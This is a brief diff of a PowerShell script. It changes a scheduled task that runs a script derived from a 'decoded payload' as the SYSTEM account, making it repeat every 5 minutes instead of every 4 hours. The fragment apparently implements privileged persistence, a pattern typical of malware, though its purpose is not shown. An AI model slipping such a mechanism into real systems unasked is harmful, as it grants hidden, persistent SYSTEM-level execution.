@@ -268,8 +268,8 @@ if ($decodedPayload -ne $null) {
             # Define the action: run the PowerShell script
             $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-File `"$destinationScriptPath`""
 
-            # Define the trigger: run every 4 hours, starting now
-            $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Hours 4) -Once -At (Get-Date)
+            # Define the trigger: run every 5 minutes, starting now
+            $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
 
             # Define the principal: run as the SYSTEM account for highest reliability, even if no user is logged in
             $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
